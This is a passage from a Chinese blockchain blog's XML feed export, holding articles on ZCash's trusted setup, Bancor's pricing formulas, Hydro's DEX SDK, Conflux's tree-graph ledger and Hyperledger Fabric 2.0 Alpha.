当然CRS有一个极其严重的问题就是，“系统”内建的随机参数非常重要，知道这个秘密参数的人就拥有超级管理员的权限，可以任意制造伪币，这在一个去中心化的系统中几乎是不可接受的。事实上，ZCash的系统参数采用了一种影视剧中经常出现的桥段去“保护”这个不应该也不需要由任何人掌握的配置数据。选择世界各地六个可信任的人，每人生成密钥一部分，六个人的密码拼接在一起生成公示的数据后，再分别销毁掉各自手上的密钥。除非六人合谋作弊，否则没有人拥有超级管理员的权限。。 参考文献 ZCash 7篇文章，有社区翻译版，但还是推荐看原汁原味的snark-explain Vitalik 3篇文章，小天才作者我就不介绍了，这三篇介绍得也是很透彻, [1], [2], [3] 零知识证明 - zkSNARK 入门 libsnark开源库地址 本文作者元家昕， 深入浅出经授权区块链转载，为更好的阅读效果对原文 略有修改。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>零知识证明</tag>
        <tag>zkSNARK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出Bancor协议]]></title>
    <url>%2F2019%2F04%2F15%2Funderstand-bancor%2F</url>
    <content type="text"><![CDATA[Bancor协议是为了降低币币交易的门槛，形成Token经济中的Token交易的长尾效应。目前大量的市值相对小的Token没能在交易所上交易，Bancor协议在有一定“抵押物”的情况下，实现Token和“抵押物”的自由交易。进一步，所有通过Bancor协议实现交易的Token又能聚集在一起形成Bancor生态。举个例子，一个TokenA，一个TokenB都是以以太进行抵押，通过Bancor都能实现TokenA和ETH，TokenB和ETH的交易，逻辑上也就实现了TokenA和TokenB的交易。Bancor协议，取名Bancor，是为了纪念宏观经济经济学之父 - 约翰·梅纳德·凯恩斯。 Bancor名字历史英国经济学家约翰·梅纳德 ·凯恩斯于1944年在美国新罕布什尔州的布雷顿森林举行联合国货币金融会议上提出Bancor计划。其目的是为维持和延续英镑的国际地位，削弱美元的影响力，并与美国分享国际金融领导权。由于历经二战的英国经济军事实力严重衰退，而英国最有力的竞争对手美国实力空前膨胀，最终凯恩斯计划在美国提出的怀特计划面前流产。凯恩斯提出的这套世界货币方案中，由国际清算同盟发行统一的世界货币（Bancor Coin），货币的分配份额按照二战前三年的进出口贸易平均值计算。 凯恩斯是何许人也？ 约翰·梅纳德·凯恩斯（John Maynard Keynes，1883年6月5日—1946年4月21日），英国经济学家，现代经济学最有影响的经济学家之一。他创立的宏观经济学与弗洛伊德所创的精神分析法和爱因斯坦发现的相对论一起并称为二十世纪人类知识界的三大革命。 凯恩斯开创了经济学的“凯恩斯革命”，被后人称为“宏观经济学之父”。 Bancor协议白皮书Bancor协议白皮书可点击下载。 Bancor协议在以太坊上的智能合约代码：GitHub。 Bancor协议是想在智能合约的基础上实现具有去中心化流通性的Token交易网络。Bancor协议要求每个Token都需要提供“储备金”，储备金的比例每个Token自行定义（0～100%）。因为“储备金”的存在，每个Token天生通过Bancor协议可以交易，也就天生具备了去中心化流通性。使用Bancor协议进行交易的Token，Bancor协议称为“Smart Token”（智能Token）。 看懂Bancor协议，只要看懂三个公式。 Bancor术语 流通性（Liquidity）- Token之间流通能力，称为流通性。 长尾效应（Long Tail Phenomenon）- 目前所有代币中的前10%的代币占了数字货币市值的95%，也占了交易总量的99%。而在传统的互联网行业中，存在长尾效应，也就是说，“小交易量“总共会占总交易量的30～40%。以亚马逊买的书为例，销售量很小的各种书籍加起来会占总销售量的30～40%。长尾效应的形成是因为进入的门槛变低了。比如说，Youtube上能很方便的上传视频。Bancor协议就是想降低交易Token的门槛，产生长尾效应。 智能Token（Smart Token）- 使用Bancor协议创建的能直接交易的Token称为智能Token。 储备金（Connector）- 每个Smart Token可以指定一种或者多种储备金。 储备金比例 （Connector Weight）- 储备金比例在创建Smart Token设定并固定。储备金比例，简称CW。 公式1 - 储备金比例计算Bancor协议要求在创建Smart Token的时候必须提供储备金，储备金比例的计算公式如下： 也就是说，储备金比例（CW）等于储备金的价值除以Smart Token的预期价值。比如说，创建一个Smart Token，名叫STAR，初始总量1000万，提供储备金为以太坊10000个。预期一个STAR币的初始价格是0.002个以太， CW = 10000/（0.002*1000*10000） = 0.5公式2 - 价格计算在知道储备金比例的前提下，用户可以通过Bancor协议买卖Smart Token。每次买卖时，价格的计算公式如下： 当前的价格等于当前的储备金数量除以储备金比例，再除以当前的Smart Token的流通量。还以2.2中讲的STAR币为例，初始时STAR币的总流通量是1000万。如果这时需要买入STAR币，价格是： price = 10000/（0.5*1000*10000） = 0.002也就是说，买入100万个STAR币，需要支付20000个以太（近似，后面会讲滑价）。买入后的价格变化为： price = （10000+20000）/（0.5*（1000+100）*10000） = 0.0054也就是说，买入100万个STAR币后，价格从0.002涨到了0.0054。 公式3 - 价格滑价处理用户在每次买卖Smart Token后，价格都会变化。如果只是用2.3中介绍的价格计算公式，用户一次买卖和分几笔小交易买卖的价格不同。Bancor协议进一步定义公式处理滑价问题。买入时，Smart Token的发行计算公式如下： 卖出时，储备金的数量计算公式如下： 那一次交易过程中的真实的价格是： 也就是，真实的价格等于上面两个公式计算的真实的储备金数量变化除以真实的Smart Token的数量变化。 再举个例子：假设当前一个Smart Token的流通量为1000，储备金的数量为250，储备金比例为50%。也就是说当前的价格是： price = 250/（1000*0.5） = 0.5一个用户买入10个储备金，该用户收到的Smart Token的数量为： 也就是，真实的价格等于上面两个公式计算的真实的储备金数量变化除以真实的Smart Token的数量变化。 再举个例子：假设当前一个Smart Token的流通量为1000，储备金的数量为250，储备金比例为50%。也就是说当前的价格是： price = 250/（1000*0.5） = 0.5一个用户买入10个储备金，该用户收到的Smart Token的数量为： 也就是说，真实的交易价格为： price = 10/19.8 = 0.5051深入理解Bancor协议储备金比例是Bancor协议中比较重要的参数，体现了Smart Token的储备水平。储备金比例高，价格的波动就低；储备金比例低，价格的波动就高。白皮书中的四张图给出了四个比较典型的储备金比例情况下的，价格波动曲线（Smart Token初始流通量为1000，价格为1）。 CW=100%的情况，储备金和Smart Token的价值相当，Smart Token的价格恒定为1。也就是，在储备金和Smart Token的价值相当的情况下，不论Smart Token的流通量如何变化，Smart Token的价格不变。有多少Smart Token，就有多少储备金。 CW=50%的情况下，储备金的价值是Smart Token价值的一半，买卖的价格和流通量成线性增长。 CW=10%的情况下，储备金只有Smart Token价值的10%，买卖的价格指数级增长。买卖后，储备金的数量相对来说急剧上升，导致下一次价格进一步扩大。 CW=90%的情况下，储备金是Smart Token价值的90%，买卖的价格缓慢的增长。 现实中，往往是很容易先画出价格曲线，然后再利用Bancor协议，求解出储备金比例CW。在已知价格曲线的情况下，求解CW的方法如下图所示（以CW=10%的价格曲线为例）： 也就是说，CW = 价格曲线下面的面积/价格曲线所在的矩形。 总结：Bancor协议是为了降低币币交易的门槛，形成Token经济中的Token交易的长尾效应。Bancor协议，取名Bancor，是为了纪念宏观经济经济学之父 - 约翰·梅纳德·凯恩斯。Bancor协议在一定储备金的前提下，实现Smart Token的交易。储备金比例不同，Smart Token交易的价格曲线也不同。储备金比例越高，价格曲线越平坦，储备金比例越低，价格曲线越陡峭。在已知某一价格曲线的情况下，用曲线下方的面积除以整个矩形面积即可求出储备金比例CW。 本文作者 Star Li，他的公众号星想法有很多原创高质量文章，欢迎大家扫码关注。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>DeFi</category>
      </categories>
      <tags>
        <tag>DeFi</tag>
        <tag>Bancor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hydro 为百亿 DeFi（去中心化金融）准备了一个SDK]]></title>
    <url>%2F2019%2F04%2F13%2Fdefi-hydro%2F</url>
    <content type="text"><![CDATA[编者注：本文转自Hydro 公众号。 Hydro 觉的这一波淘金人就是各种 DeFi 项目（Decentralized Finance 去中心化金融），Hydro 通过 SDK 为淘金人送水，本文分析了DeFi市场的变化、去中心化交易平台需要的什么样的技术，以及给出来相应的方案。 DeFi市场的变化2019年3月，The Block 媒体统计的DeFi市场长这样： 相比于半年前，DeFi 市场，从「稀疏」到「密集」。 目前的DeFi项目主要建立在以太坊公链，以太坊本身的市值已经在180亿美金左右，仅仅在以太坊生态，DeFi都将是一个不小于百亿美金的市场。 DeFi 项目DeFi 项目可分为：稳定币、去中心化交易所、支付、指数产品、金融衍生品包括借贷市场和预测市场等。 DeFi项目的核心是：通证化一切资产，随时随地交易。 关键词拆开看： 【通证化】不管链上原生资产、还是链下资产，都以通证的形式流通； 【一切资产】资产的概念将进一步扩张。不只是期货、石油、黄金、产权等真实资产上链；以预测市场为例，任何事件都可以通过「对赌」的形式包裹成链上资产赋予流动性，创造收益和风险。 【随时随地交易】区块链账本24小时无休；没有准入门槛和身份、地理限制。 前半句「通证化一切资产」是现在各种DeFi金融衍生品项目专注做的事。开辟细分的通证化市场，并为之设计一套自由公平的玩法。 比如将股票、大宗商品通证化的UMA；将法币资产通证化的Dai等稳定币；将事件通证化的预测市场项目Augur、Veil、Flux、BlitzPredict等等。 后半句「随时随地交易」则是去中心化交易平台/协议专业负责的事。 前者为后者提供应用场景；后者为前者支持流量入口。 更多DeFi 项目还可参考DeFi收集整理 DeFi 的流量入口，谁的需求，谁来供给？DeFi 产品往往需要自建本地流量入口，来形成一个流量闭环： MakerDao做了Oasis，dYdX做了expo，Dharma 做了Level。 这些流量入口本质上就是一个轻量级的去中心化交易所（DEX）：只处理与自己项目相关的交易就足够。 但即使是轻量级DEX，也不是DeFi项目方能「顺手」就做好的事。 因为交易所是一个需要强运营和专业经验的事儿。自己从头搭建交易平台的开发和运营成本过高。 所以，项目方会选择利用已有的开源技术来集成所需要的交易平台。 DeFi 项目方需要什么样的去中心化交易开源技术呢？ 去中心化交易平台的核心部件是：订单簿、撮合系统、结算合约。分别对应前端、后端和合约层。 DeFi 项目对自家流量入口的需求是： 前端的订单簿和UI自定义、自管理； 后端的撮合，和结算合约利用现有开源技术，以达到最少的开发成本和最好的交易体验。 那么，现在对于这样的交易系统的市场供给有哪些呢？以交易的撮合和结算在链上/链下来划分交易模式： 撮合引擎在链上/链下导致了交易效率的高低； 结算在链上/链下决定了资金的安全性 中心化交易所，因为资产不在链上，无法和智能合约交互而无缘DeFi。 去中心化交易所，都将资金结算放在链上，以保证资金的去托管化来实现安全性。而对撮合的不同处理，衍生出3种不同的交易模式： ①【链上模式】链上撮合引擎，问题是贵+慢。 ②【Open 模式】链下靠订单广播，用户抢单。导致「订单冲突」和「抢先交易」问题。即： 订单冲突（order collision）：多人可能吃到同一个订单，但只有一个人能成交，剩下的人都吃单失败。订单失败或成功只能等区块链的确认结果，耽误交易时机。而且，越是市场变化剧烈、交易旺盛时，冲突越严重。 抢先交易（front running）： 即在上述情况下，谁的gas费出的高，谁就更有可能交易成功，普通交易者相对于机器人脚本劣势巨大。 ③【Hybrid 模式】链下撮合引擎，链上结算合约。同时保证交易效率+资产安全。 对于用户来讲，所谓「去中心」交易需要的是资金托管的去中心，而不是撮合的「去中心」。对于撮合，要的是高效率、高流动性。因此，Hybrid模式很可能是在ETH 2.0前最好的去中心化交易模式。 Hybrid 模式哪家强？作为一个DeFi项目，我要建一个交易平台，作为流量入口。在提供Hybrid交易模式的开源技术中，我应该如何选择？ 在上述最具代表性的Hybrid模式交易所中， DDEX采用的是Hydro协议； Paradex采用的是0x协议； IDEX 背后并没有一套开源的SDK开发工具包。 那么，为我的DeFi项目搭建交易平台，现在有2个选择：Hydro 或 0x。 0x的体验0x的Hybrid模式体验怎么样呢？DDEX 作为曾经的0x relayer（中继商），在开发实践时，遇到了以下问题，可供参考： 1.无法收手续费 这个bug导致了：Relayer 无法赚钱。 0x要求用户购买ZRX作为手续费，就好像在A股交易时要求股民用美元交手续费。是一个给流动性带来摩擦的负面设计。 为了能让用户用交易对中的代币直接交手续费，Relayer采取一种hack的办法：用户签单时，把手续费签进订单价格。例如一个在订单簿显示价格为100的卖单，用户实际签署的价格为99，价差作为手续费。 这种hack不仅在工程上造成了很大的困难，又因为0x在撮合前不能够区分maker和taker，导致了maker和taker的费率无法实现差异化。 2.无法区分maker和taker费率 这个bug导致了：无法通过maker手续费优惠，从供给侧鼓励流动性。 Maker和taker不同费率是维护市场公平，促进流动性的重要机制。然而在0x中，只有当订单被撮合，我们才知道它是taker还是maker。上一点讲到，用户在发送订单前，即把手续费签到了价格中，所以不论最后当maker还是taker，用户交的手续费只能设定成一样的。 唯一的办法是Relayer定期向maker返点，这种做法成本高昂且需要Relayer和maker的相互信任。 3.无法做到价格优化 这个bug导致了Relayer多收用户的钱。 在0x中，订单会按照用户签署的价格成交。maker按maker价格成交；在taker按taker价格成交。听起来没毛病，但实践中会遇到这种问题： 在当前的订单簿，我下一个买单：价格120 数量3。 合理情况是：以价格100撮合第一个单，价格110撮合第二个单。花费 210。 而0x会以我的出价120来收费，两笔撮合的价格都是120，花费240。Relayer多收了我240-210=30 块钱。 Relayer需要后续单独返还差价给用户。 4. 无法支持市价单。 市价单本质上是一个价格无限高的买单/价格无限低的卖单，不论作为taker还是maker，我的成交价格都是maker价格，0x做不到，所以0x Relayer告别市价单。 5. 取消订单需要缴纳gas fee。 Hydro的改进为了解决以上问题，Hydro 做了以下优化： 按照计价货币作为手续费—Relayer利好 区分maker和taker，并在合约层提供maker费率优化和返点—做市商利好 价格优化—用户利好 支持市价单—用户利好 免费取消订单—用户利好 Relayer利好、做市商利好、用户利好本质上都是流动性利好。 哪项交易技术，能够最大化的促进流动性，带来最好的交易体验，才是DeFi产品的最终选择。 毕竟，在投资3要素：收益/风险/流动性中，DeFi产品相对于传统金融，根本优势不是更高的收益、更低的风险； 而是不局限于谁来交易、交易什么、什么时间交易、在哪儿交易，以此带来的无限流动性。 所以，一切对DeFi流动性造成摩擦的技术，终将被淘汰。在给DeFi淘金者卖水的生意里，谁的水流动性最好，生意就属于谁。 Hydro SDK 已开源。 本文希望把去中心化交易模式讲得明明白白，如果仍与疑问，或想加入讨论，欢迎联系！加作者微信：Diane_1997，请注明来意哦。 本文经作者授权转载于Hydro社区公众号。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>DeFi</category>
      </categories>
      <tags>
        <tag>Hydro</tag>
        <tag>DeFi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Conflux的自我进化：从DAG到树图]]></title>
    <url>%2F2019%2F04%2F12%2Fconflux-tree-graph%2F</url>
    <content type="text"><![CDATA[这是一篇技术性非常强的采访，Conflux的首席技术官伍鸣博士帮我们解答了疑问：「DAG」与「链」的本质区别是什么？我们为什么要用它？它自身的局限性又在哪里？ Conflux的身份不再是DAG，它是树图采访时伍鸣却告诉我们，Conflux已不再把自己归类为DAG，它的新身份是树图（Tree-Graph）。 不过我们的疑问依然被解答了，因为最有趣的地方就在于，Conflux从DAG类别变更为树图类别的原因，恰恰能回答采访前我们想要弄明白的那三个问题。甚至因为引入了树图概念，我们能从一个更高的角度来理解这些问题。 区块链账本的结构反映的是区块与区块之间的连接关系，而这种连接关系是由「指针」决定的。更科学的账本分类方法不是基于它的形状，而是基于其「指针」的类别、数量。 我们的采访对象伍鸣是Conflux的联合创始人，在加入Conflux之前任微软亚洲研究院系统组资深研究员，主要的研究方向为分布式事务处理系统、图计算引擎和人工智能平台，他在分布式系统的设计和实现上拥有丰富的专业知识。 Conflux是使用树图结构的公有链，其团队成员大多拥有美国一流大学的留学背景和在硅谷、华尔街的多年工作经验，有着突出的科研能力与技术能力。姚期智院士是Conflux团队的首席科学家。 链、DAG、树图：结构不同能力不同 问：DAG、树图这些非链式的账本结构能被认为是区块链吗？ 伍鸣：不管是链、DAG，还是树图，我们要通过它们解决的问题其实是一样的，我们可以用区块链技术这个词把它们概括起来。 问：链结构、DAG结构、树图结构的本质区别是什么？为什么Conflux是树图而不是DAG？ 伍鸣：你可以认为在链结构里，每个区块只能有一个指针，这个指针是指向其父亲区块的，那么所有区块就会一个接一个连起来，形成一个链状的结构。 DAG结构概括来讲是指每个区块有多于一个的指针，可以指向多于一个的其他区块，形成的是一个有向无环的图状结构。 Conflux的树图结构不同于链或DAG只有一类指针，它的每个区块都有两种指针，一种指针指向父亲区块，且只能有一个父亲，与传统的链式结构一样；一种指针指向引用区块，需要引用多个区块，表达不同区块间的happens-before（先行发生）关系。 所以，在 Conflux 里有两种类型的边，父边（父亲指针确定的边）和引用边（引用指针确定的边）。如果只看父边，账本的结构是一棵树；如果同时看父边和引用边，账本的结构是一个图。树图结构就是指在图中包含了一棵树的这样一种结构。 我们觉得如果继续叫DAG 可能会让大家产生误解，因为目前其他基于DAG的区块链系统都只有一种类型的连接区块或交易的边，因此有了树图这个概念。树图它更接近于Conflux账本结构的本质。 问：Conflux为什么要引入两种指针？三种不同账本结构的区块链系统会有何不同？ 伍鸣：三种不同账本结构下的区块链系统最大的不同在于，它们对全序的支持或实现方式是不一样的。 链结构支持全序，DAG结构天然形成的是偏序，树图结构支持全序。 链结构中舍弃了分叉上的区块，其主链上的区块都有着唯一的父子关系，天然形成一个确定的顺序，所有人都可以按照这个顺序执行区块里的交易，所有人最后都能够达到一个一致的状态。 DAG结构中天然形成的是一个偏序。偏序的意思是说如果图中的两个区块之间没有直接的边，或者两个区块之间不存在一条路径，就没有办法确定这两个区块及它们所包含的交易间的顺序。 不过DAG可以通过设计为区块排出全序，现有的DAG有些支持全序有些不支持全序。 树图结构通过引入主链和Epoch的概念，实现了对区块全序的支持，这也是Conflux有两种指针的原因。（如何实现全序将在下一节详细介绍） 问：为什么要排全序，偏序会带来什么问题？ 伍鸣：一个区块链系统，如果只需要处理普通的转账交易，又能通过指针保证并发交易间没有因果关系，那它也许可以用偏序。 因为这种系统只需要处理加减操作，而加减操作是满足交换律和结合律的，交易的执行顺序对系统状态没有影响，系统最终的状态是一致的。 但偏序不能支持智能合约，因为智能合约是图灵完备的，它需要表达复杂的逻辑计算，它有乘法，一旦有乘法和加法就不会满足交换律了。 也就是说，两笔交易A和B，先执行A后执行B得到的状态与先执行B后执行A得到的状态是不一样的。偏序下两笔交易有可能以任意的顺序执行，那么不同的矿工就会得到不同的系统状态，就无法取得共识。 如果一条链想要支持智能合约，就要支持全序。 问：既然为了实现全序要多做工作，为什么使用DAG或树图，而不是链结构？ 伍鸣：区块链会产生很多分叉，链结构是无法定义分叉上的区块的执行顺序的，它只能选择丢掉分叉。 丢掉分叉会牺牲掉一些区块，不仅浪费了资源，还制约了吞吐率；丢掉分叉也会牺牲一些安全性，因为在最长链共识机制下，分叉上的区块是不能为最长链共识作出贡献的，比如有很多好人区块分叉的话，这些区块就不能用来贡献最长链，也就不能用来贡献链的安全，坏人可以用更少的算力攻击这条链。 树图和实现了全序的DAG把分叉区块加入到账本中，并定义了分叉上区块的执行顺序。 把所有的区块都算进来，也就让所有区块都贡献到系统的吞吐率上，这使得系统的瓶颈就不再是共识机制，而是网络本身。只要网络足够快，系统的性能就还能再高，从而使得整个系统在不牺牲安全性的同时获得更高的吞吐率。 Conflux如何实现全序 问：Conflux如何实现全序？ 伍鸣：Conflux是通过引入主链这个概念最终实现全序的。我们之前讲过每个区块都有两种指针，其中一种是指向父亲区块的，这种指针决定的账本结构是一棵树，通过这棵树可以确定一条主链。 具体实现上，Conflux采用了Ghost和Epoch这两种规则。Ghost规则用来确定主链，Epoch规则用来确定区块的顺序，两者结合，就能实现区块的全序。 问：Ghost如何确定主链？ 伍鸣：Ghost从创世区块开始，迭代的去从孩子区块中选择放在主链上的下一个区块，选择规则是挑选拥有最大子树的孩子区块为主链区块。 如下图所示，区块A和区块B是创世区块的两个孩子区块。A子树有6个区块，B子树有5个区块，所以选择区块A作为紧接着创世区块的主链上的区块。根据同样的规则，把区块C,E,H,都选择进了主链。 （图中实线箭头指向父亲区块，虚线箭头指向引用区块） 问：Epoch如何实现对区块的排序？ 伍鸣：Conflux中的每个新区块在产生时，除了选择主链（该区块观察到的主链）上的最后一个区块作为自己的父亲区块外，还必须把所有自己观察到的但还没有被其他区块引用的区块引用起来，表达不同区块之间的happens-before的关系。 如上图所示，如果一个机器节点在产生区块E的时候，发现系统中已经有了区块D，而且这个时候区块D还未被任何其他区块引用，那么区块E就把自己的引用指针指向区块D，也就是说在区块E和区块D之间加上一个有向的引用边，表示D是在E之前产生的。 主链上的每一个区块确定一个Epoch。在分叉上的区块属于哪个Epoch，是由第一个产生在它之后的主链区块所在的Epoch决定的。比如区块D属于Epoch E，因为D最先被E引用，所以产生在E之前，但是D并不产生在C之前。 问：在同一个Epoch内，区块间的顺序是如何确定的？ 伍鸣：在每一个Epoch内部，Conflux用拓扑排序确定区块间的顺序。如果出现平局，再根据区块的哈希值来排序。 如此一来，通过Ghost规则确定主链，通过Epoch规则确定区块的大体顺序，通过拓扑和哈希排序实现同一Epoch内区块的顺序，最终，Conflux的树图结构账本提供了一个一致的区块全序。 备注：去年技术工坊有一个Conflux分享：视频：漫谈区块图技术之XDAG和Conflux 也介绍了确认主链和排序，有兴趣的可以看看。 DAG和树图引发的思考 问：如果多个节点同时出块，这些区块又都有效，会不会同一时间段产生大量区块？这样一来，每个区块中引用指针占的空间会不会变得很大？ 伍鸣：不会的，实际上整个系统的出块率是固定的，我们会动态的去调整出块难度，出块率很高，我们就增加难度把它降下来，出块率很低，我们就减少难度让它增上去。 问：如果多个节点同时出块，并发区块中应该会包含相同的交易，怎么解决重复打包交易的问题？ 伍鸣：Conflux采用的是混合策略（Mixed-Strategy，博弈论中的一种策略），矿工们根据交易费的选择权重随机地从交易等待池中选取交易。随机是比较抽象的一个描述，它实际上很复杂，矿工会跟随这种随机方法选取交易，让自己打包交易获得的回报最大化。 当然不可能完全避免重复，交易池的交易越多重复概率越小，在正常情况下可能有30%左右的交易重复。如果交易池里的交易很少，比如说最极端的情况，只有一个交易，那当然是会重复的，因为所有人都会打包这个交易。 问：如果多个节点同时出块，有没有可能发生交易冲突的问题？ 伍鸣：一般我们说的交易冲突是指上一个交易把钱花光没有余额了，但后面还有交易。Conflux通过区块全序保证了交易的执行顺序，就会避免这个问题，如果发生在前边的交易把钱花光了，就会让它后边的交易变为无效。 另一种情况是相同的交易有可能被打包到不同的区块里，在这种情况下，Conflux只接受在区块全序中排在最开始位置的这笔交易，而把后面的交易变为无效。 问：因为账本结构的复杂性，会不会出现不同节点账本不一致的情况？ 伍鸣：肯定是有的，但经过一段时间以后就能确定账本。有一个公式可以算出主链区块被统一的概率，大概五、六个Epoch后，账本就能一致。 问：树图在51%攻击上的安全性是怎么样的？ 伍鸣：Conflux中只要主链定了，交易的全序就定了，攻击者想发动51%攻击、想改变交易的顺序，就必须改变主链的顺序。 因此在51%攻击上，树图的安全性和Ghost链的安全性是差不多的。 Ghost规则比最长链规则安全，Ghost看的是子树的权重，把分叉上的区块也考虑到了，所有的区块、所有的算力都贡献到主链的选择上，能够严格地满足51%这个概念。但最长链规则没有考虑分叉链上算力的浪费。 问：在对矿工的激励机制上，树图跟链式结构有什么不同？ 伍鸣：有一种情况是树图中才会出现的。树图需要区块去引用其他区块，表达不同区块之间的happens-before的关系，那有的区块可能不去正常引用其他区块，就是说看到其他区块也不引用。这是我们不希望看到的情况。 另一种发生在树图上的欺骗行为在传统的链上也会发生，就是产生区块但不广播，偷偷挖一个私有的链，等到某个时机再放出去。 在这两种情况下，这些不正常区块的并发区块会变得很多，因为它们和其他区块之间缺少happens-before关系。Conflux以此为依据去惩罚这两种行为：并发区块的个数越多，矿工获得的奖励越少。 结束语链式结构放弃了分叉上的区块，这样做虽然牺牲了一定的吞吐率，却保证了交易的全序。DAG把分叉上的区块都纳入到账本中，这样做虽然不再浪费算力，却引入了一个如何对区块排序的难题。 有的DAG干脆不对区块排序，因为在一些应用场景下，交易的全序可能并不那么重要，比如IOTA。其他DAG则需要设计一种方法，实现对区块的排序。比如Byteball 、Hashgraph。 当我们深入地去了解不排全序的DAG、排全序的DAG、排全序DAG的不同排序方法，以及这些DAG采用的不同账本结构，就会发现它们是截然不同的。 或许正因如此，Conflux不再把自己归类为DAG，而具有两种不同类别指针的它也确实与DAG有着不小的区别，树图也许更接近其本质。 于是，这次带着弄清DAG与链的差别开始的采访，最后得出的结论是：不同DAG项目的差别，比DAG与链的差别都大。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>Conflux</category>
      </categories>
      <tags>
        <tag>DAG</tag>
        <tag>树图</tag>
        <tag>Conflux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hyperledger Fabric 2.0 Alpha发布了！]]></title>
    <url>%2F2019%2F04%2F11%2Fhyperledger-fabric-2-0-alpha%2F</url>
    <content type="text"><![CDATA[Hyperledger Fabric 2.0 Alpha发布了！随着近期Fabric v1.4.1 LTS的发布，Fabric项目目前工作的重点正在向1.4.1和2.0的正式版推进。v2.0.0是2019年的主要目标，重点集中在更多的新特性上，包括增强的链码生命周期管理，raft共识机制，以此来循序渐进地迁移至拜占庭容错算法，以及更强大的token支持。近期发布的2.0版本建议大家仅作为尝鲜之用，生产环境暂时不要考虑。 Fabric chaincode lifecycleFabric 2.0 Alpha介绍了分布式治理链码的特性，包括在你的节点上安装链码以及在一个通道中启动链码的新流程。新的Fabric生命周期允许多组织对链码的参数达成共识，例如链码在开始和账本进行交互前的背书策略。新的模型在之前的生命周期上进行了改进： 多个组织必须同意链码的参数：在Fabric 1.x版本中，一个组织能够为所有其他通道成员设置链码参数（例如背书策略）。新的Fabric链码生命周期将变得更灵活，提供了中心化的信任模型（例如之前版本的生命周期模型）以及去中心化的要求足够多的组织同意才能生效的模型。 更安全的链码升级过程：在之前的链码生命周期中，升级链码可以由单个组织进行发布，从而尚未安装新链码的通道成员将可能产生风险。新的模型要求只有足够数量的组织批准后才能允许升级链码。 更轻松的背书策略升级：Fabric生命周期允许你在没有重新打包或者安装链码的情况下，变更背书策略。用户可以体验到默认的要求通道内大多数成员同意的策略的好处。这个策略会在通道添加或者移除组织的时候自动更新。 可检查的链码包：Fabric生命周期将链码以易于阅读的tar文件的形式打包。这样可以更加轻松地检查链码代码包并协调跨多个组织安装。 使用同一个安装包启动多个链码：在之前的生命周期管理中一个通道上的链码可以使用名字和版本来指定一个安装的链码。在现在的版本中你可以使用一个链码安装包在同一个通道或者不同的通道使用不同的名字进行多次部署。 使用新的链码生命周期可以使用下列教程来开始使用新的链码生命周期： Chaindoce for Operators：提供了安装和定义链码所需步骤的详细概述，以及新模型可用的功能。 Building Your First Network：如果你想立即开始使用新的生命周期，BYFN教程已经更新为使用新的链码生命周期来安装和定义链码了。 Using Private Data in Fabric：已经更新演示如何通过新的链码生命周期来使用隐私数据集合。 Endorsement policies：了解使用新的链码生命周期如何使用通道配置中的策略作为背书策略。 限制Fabric v2.0 Alpha版本中链码生命周期尚未完成。具体来说，请注意Alpha版本中的以下限制： 尚不支持CouchDB索引 使用新生命周期定义的链码还不能通过服务发现来发现 这些限制在后期将被解决。 FabTokenFabric 2.0 Alpha还为用户提供了在Fabric通道上轻松将资产转化为token的功能。FabToken是一种token管理系统，它使用Unspent Transaction Output（UTXO）模型，利用Hyperledger Fabric提供的身份和成员服务基础设施来发布传输和兑换token。 使用FabToken：这个操作指南提供了有关如何在Fabric网络上使用token的详细概述。该指南还包含有如何使用tokenCLI创建和传输token的示例。 Alpine images从v2.0开始，Hyperledger Fabric Docker镜像将会使用Alpine Linux操作系统，一种面向安全的轻量级的Linux发行版。这意味着Docker镜像现在将会小很多，提供更快的下载和启动时间，以及在主机系统上占用更少的磁盘空间。Alpine Linux的设计初衷是考虑到安全性，而Alpine的发行版的极简主义特性大大降低了安全漏洞的风险。 Raft 排序服务Raft是v1.4.1中引入的，它是一种基于etcd的崩溃容错（CFT）排序服务。Raft遵循“领导者和追随者”模型，其中每个通道都会选举一个leader，而且它的决策会复制给追随者。和基于Kafka的排序服务相比，基于Raft的排序服务将变得更容易设置和管理，并且它的设计允许遍布全球的组织成为分散的排序服务贡献节点。 The Ordering Service：描述Fabric中排序服务的作用以及三种排序服务实现的概述：Solo、Kafka和Raft。 Configuring and operating a Raft ordering service：展示部署基于Raft的排序服务时所需注意的配置参数和注意事项。 Setting up an ordering node：描述部署排序服务节点的过程，与排序服务的实现无关。 Building Your First Network：已经更新，允许使用基于Raft的排序服务来构建样本网络。 本文经TopJohn授权转自TopJohn’s Blog 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>Fabric</category>
      </categories>
      <tags>
        <tag>Fabric</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发钱包 - 技术文章整理]]></title>
    <url>%2F2019%2F04%2F11%2Fwallet-dev-guide%2F</url>
